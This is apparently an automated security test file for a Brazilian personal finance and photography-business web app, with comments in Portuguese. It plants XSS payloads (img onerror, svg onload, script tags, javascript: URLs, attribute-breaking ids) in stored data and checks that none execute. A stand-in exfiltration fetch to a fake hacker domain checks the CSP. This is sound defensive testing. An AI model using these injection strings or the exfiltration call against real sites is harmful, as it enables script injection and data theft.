/* Etapa 20 · Vigia de segurança: tenta invadir o app do jeito que um hacker faria e confere que nada passa.
   Roda a cada mudança no código (GitHub). Se algum ataque funcionar, o teste falha antes de publicar. */
const { HOJE, calmo, clica, certo, igual } = require('../ajuda');
const ATAQUES = [`"><img src=x onerror="window.__xss=1">`, `'><svg onload=window.__xss=1>`, `</textarea><script>window.__xss=1</script>`, `javascript:window.__xss=1`, `" autofocus onfocus="window.__xss=1`];
/* procura no HTML da tela qualquer coisa que um ataque teria conseguido criar (vale mesmo com a CSP ligada) */
const injetado = p => p.evaluate(() => {
  const r = [];
  document.querySelectorAll('*').forEach(el => {
    for (const a of el.attributes) if (/^on/i.test(a.name)) r.push(`${el.tagName} ${a.name}`);
    if (el.tagName === 'SCRIPT' && !el.src) r.push('script escrito na página');
    if ((el.tagName === 'IMG' || el.tagName === 'IFRAME') && /^(x|javascript:)/i.test(el.getAttribute('src') || '')) r.push('src ' + el.getAttribute('src'));
    if (el.hasAttribute('autofocus')) r.push('autofocus');
  });
  if (window.__xss) r.push('o código do ataque rodou');
  return r;
});

module.exports = { etapa: 'Vigia de segurança (ataques)', testes: [
  ['injeção de código: texto de ataque em todos os campos de todas as tabelas não vira código em nenhuma tela', async (st, abrir) => {
    /* o pior caso: o ataque já está gravado no banco (painel do Supabase, arquivo de importação, chave roubada) */
    let i = 0;
    Object.entries(st.tabelas).forEach(([tab, linhas]) => {
      if (['acesso_claude', 'aparelhos', 'avisos'].includes(tab)) return;
      linhas.slice(0, 40).forEach(l => Object.keys(l).forEach(k => {
        if (['id', 'user_id', 'data', 'valor', 'tipo', 'grupo', 'status', 'data_do_evento', 'entrega', 'data_da_compra', 'data_da_conferencia', 'prazo', 'feita', 'foto'].includes(k)) return;
        if (typeof l[k] === 'string' || l[k] === null) l[k] = ATAQUES[i++ % ATAQUES.length];
      }));
    });
    /* ids e arquivos com ataque também (só dá para gravar direto no banco; o app e o SQL recusam) */
    st.tabelas.extrato.push({ id: `L1" onfocus="window.__xss=1`, user_id: 'u-joao', data: HOJE, banco: 'Nubank', descricao: ATAQUES[0], grupo: 'Desejos', tipo: 'conta', valor: -10, categoria: ATAQUES[1], subcategoria: ATAQUES[2], status: 'Pago', parcela: '', obs: '' });
    st.tabelas.trabalhos.push({ id: `J"><svg onload=window.__xss=1>`, user_id: 'u-joao', cliente: ATAQUES[0], tipo_de_evento: ATAQUES[1], etapa: 'Fechado', entregas: `[ ] ${ATAQUES[2]}\n[x] ${ATAQUES[4]}`, briefing: ATAQUES[3] });
    st.tabelas.trabalhos.push({ id: 'JX', user_id: 'u-joao', cliente: 'Com anexo', tipo_de_evento: 'Casamento', etapa: 'Fechado' });
    st.tabelas.anexos.push({ id: 'XA1', user_id: 'u-joao', trabalho: 'JX', nome: ATAQUES[0], tipo: 'Comprovante', arquivo: 'image/png', conteudo: `x" onerror="window.__xss=1` });
    st.tabelas.equipamentos.push({ id: 'EX1', user_id: 'u-joao', nome: ATAQUES[1], tipo: ATAQUES[0], valor: 10, foto: `x" onerror="window.__xss=1` });
    const p = await abrir({ larg: 1280, alt: 900 });
    const telas = [['inicio', {}], ['trabalhos', { jseg: 'quadro' }], ['trabalhos', { jseg: 'recorrentes' }], ['trabalhos', { jseg: 'balanco' }], ['tarefas', {}], ['equip', {}]]
      .concat(['extrato', 'revisar', 'bancos', 'cartoes', 'fixas', 'metas'].map(f => ['fin', { fseg: f }])).concat(['mes', 'ano', 'darzan', 'jpl', 'clt'].map(r => ['fin', { fseg: 'relatorios', rseg: r }]));
    for (const [v, o] of telas) {
      await p.evaluate(([v, o]) => { Object.assign(A.ui, o); A.ui.view = v; A.render(false); }, [v, o]);
      const r = await injetado(p); certo(!r.length, `tela ${v} ${JSON.stringify(o)}: ${r.slice(0, 3)}`);
    }
    /* fichas: lançamentos, trabalhos, equipamentos e o anexo */
    await p.evaluate(() => { A.ui.view = 'fin'; A.ui.fseg = 'extrato'; A.ui.filtro = 'tudo'; A.render(false); });
    for (const sel of ['#view [data-a=editL]', '#view [data-a=editL] >> nth=3']) { await clica(p, sel); certo(!(await injetado(p)).length, 'ficha do lançamento: ' + await injetado(p)); await clica(p, '#s2 [data-a=fechar]'); }
    await p.evaluate(() => { A.ui.view = 'trabalhos'; A.ui.jseg = 'quadro'; A.render(false); });
    for (const id of await p.$$eval('#view .job', js => js.map(j => j.dataset.id))) {
      await p.evaluate(id => { const b = [...document.querySelectorAll('#view .job')].find(j => j.dataset.id === id); b.click(); }, id);
      await p.waitForSelector('#s2 #jVid');
      certo(!(await injetado(p)).length, `ficha do trabalho ${id}: ${await injetado(p)}`);
      if (id === 'JX') { await clica(p, '#jAnx [data-a=verX]'); await p.waitForTimeout(300); certo(!(await injetado(p)).length, 'anexo: ' + await injetado(p)); }
      await clica(p, '#s2 [data-a=fechar]');
    }
    await p.evaluate(() => { A.ui.view = 'equip'; A.render(false); });
    await clica(p, '#view [data-a=editE][data-id="EX1"]').catch(() => { });
    certo(!(await injetado(p)).length, 'ficha do equipamento: ' + await injetado(p));
    certo(!(await p.evaluate(() => window.__xss)), 'nenhum código de ataque rodou');
  }],
  ['política de segurança (CSP): script escrito na página e conexão para site estranho são bloqueados; o app não abre dentro de outro site', async (st, abrir) => {
    const p = await abrir();
    const csp = await p.getAttribute('meta[http-equiv="Content-Security-Policy"]', 'content');
    certo(/script-src 'self'(;|$)/.test(csp) && !/unsafe-eval/.test(csp) && !/script-src[^;]*unsafe-inline/.test(csp) && /object-src 'none'/.test(csp) && /base-uri 'none'/.test(csp), 'CSP forte: ' + csp);
    certo(!(await p.$('script:not([src])')), 'nenhum script escrito direto na página');
    await p.evaluate(() => { const s = document.createElement('script'); s.textContent = 'window.__inl = 1'; document.body.appendChild(s); });
    const vazou = await p.evaluate(() => fetch('https://exemplo-hacker.invalid/roubar?d=1').then(() => true, () => false));
    certo(!(await p.evaluate(() => window.__inl)) && !vazou, 'script injetado não roda e dados não saem para outro site');
    p.erros.length = 0; /* os bloqueios acima aparecem como erro no console: é o esperado */
    /* site falso tentando abrir o app escondido dentro dele */
    const q = await p.context().newPage(); q.erros = [];
    await q.goto(`http://localhost:${st.porta}/`); /* um "site de fora" (outro endereço) */
    await q.evaluate(u => { document.body.innerHTML = `<iframe id="f" src="${u}" style="width:400px;height:400px"></iframe>`; }, `http://127.0.0.1:${st.porta}/financas/`);
    await q.waitForTimeout(1500);
    const dentro = q.frames().find(f => /\/financas\/$/.test(f.url()) && f !== q.mainFrame());
    const mostrou = dentro ? await dentro.evaluate(() => !!document.querySelector('#login:not([hidden]), #view')).catch(() => false) : false;
    certo(!mostrou || /127\.0\.0\.1.*\/financas\/$/.test(q.url()), 'o app apareceu dentro de outro site');
    await q.close();
  }],
  ['arquivo de "Trazer correções" malicioso: não grava aparelhos/avisos, ids com código nem colunas estranhas', async (st, abrir) => {
    const p = await abrir();
    const r = await p.evaluate(() => A.trazerCorrecoesTeste({ abas: {
      APARELHOS: [{ ID: 'DHACK', 'NOME': 'celular do hacker', 'ENDPOINT': 'https://hacker.invalid/push' }],
      AVISOS: [{ ID: 'VHACK', 'TITULO': 'Pix urgente', 'QUANDO': '2026-10-27' }],
      EXTRATO: [{ ID: 'L1"><img src=x onerror=alert(1)>', 'VALOR': -1 }, { ID: 'LOK1', 'DESCRIÇÃO': 'correção boa', 'VALOR': -5, 'DATA': '2026-10-27' }, { ID: 'LOK2', 'DESCRIÇÃO': 'x', 'user_id': 'u-outro' }],
    } }));
    certo(r.novos === 1 && r.ignorados === 2 && r.ops.every(o => o.aba === 'EXTRATO' && o.registro.ID === 'LOK1'), 'só a correção boa entra: ' + JSON.stringify(r));
  }],
  ['sair do aparelho apaga tudo dele; a chave do Claude nunca fica guardada; excluir trabalho apaga os documentos do cliente', async (st, abrir) => {
    st.tabelas.trabalhos.push({ id: 'JDOC', user_id: 'u-joao', cliente: 'Cliente LGPD', tipo_de_evento: 'Casamento', etapa: 'Fechado' });
    st.tabelas.anexos.push({ id: 'XDOC', user_id: 'u-joao', trabalho: 'JDOC', nome: 'contrato com CPF', tipo: 'Contrato', arquivo: 'application/pdf', conteudo: 'data:application/pdf;base64,JVBERi0=' });
    const p = await abrir();
    /* chave do Claude: aparece na hora, mas não fica em lugar nenhum do aparelho */
    const chave = await p.evaluate(() => A.claude.criar());
    certo(/^dfc_[A-Za-z0-9_-]{40,}$/.test(chave), 'chave forte: ' + chave.length);
    certo(!(await p.evaluate(() => Object.keys(localStorage).some(k => /dfc_/.test(localStorage.getItem(k)) || /chave-claude/.test(k)))), 'a chave ficou guardada no aparelho');
    /* excluir o trabalho: o contrato vai junto (no app e no Supabase) */
    await p.evaluate(() => { A.ui.view = 'trabalhos'; A.render(false); });
    await clica(p, '#view [data-a=editJ][data-id="JDOC"]');
    await clica(p, '#s2 [data-a=apagarJ]'); await clica(p, '#s2 [data-a=apagarJ]'); await calmo(p);
    certo(!st.linhas('trabalhos').some(j => j.id === 'JDOC') && !st.linhas('anexos').some(x => x.id === 'XDOC'), 'o contrato do cliente ficou para trás');
    certo(!(await p.evaluate(() => A.db.linhas('ANEXOS').some(x => x.ID === 'XDOC'))), 'o contrato ficou na cópia do aparelho');
    /* sair: nada dos dados fica no aparelho */
    await p.evaluate(() => { A.ui.view = 'inicio'; A.render(false); });
    await clica(p, '#view [data-a=conta]'); await clica(p, '#s2 [data-a=sair]');
    await p.waitForSelector('#login:not([hidden])');
    const sobrou = await p.evaluate(() => Object.keys(localStorage).filter(k => /^df-(dados|fila|sessao|chave-claude|aparelho|faceid)/.test(k)));
    certo(!sobrou.length, 'sobrou no aparelho depois de sair: ' + sobrou);
  }],
  ['o Supabase recusa id com código, arquivo que não é foto/PDF e foto de site de fora', async (st, abrir) => {
    const p = await abrir();
    const r = await p.evaluate(async () => {
      const tenta = (t, l) => A.nuvem.gravar(t, [l]).then(() => 'aceitou', e => 'recusou');
      return [await tenta('extrato', { id: 'L"><b>', descricao: 'x' }), await tenta('anexos', { id: 'XBAD', conteudo: 'javascript:alert(1)' }), await tenta('equipamentos', { id: 'EBAD', foto: 'https://site-falso.invalid/x.png' }), await tenta('extrato', { id: 'LBOM-1', descricao: 'normal' })];
    });
    certo(JSON.stringify(r) === JSON.stringify(['recusou', 'recusou', 'recusou', 'aceitou']), 'regras do banco: ' + JSON.stringify(r));
    p.erros.length = 0;
  }],
] };
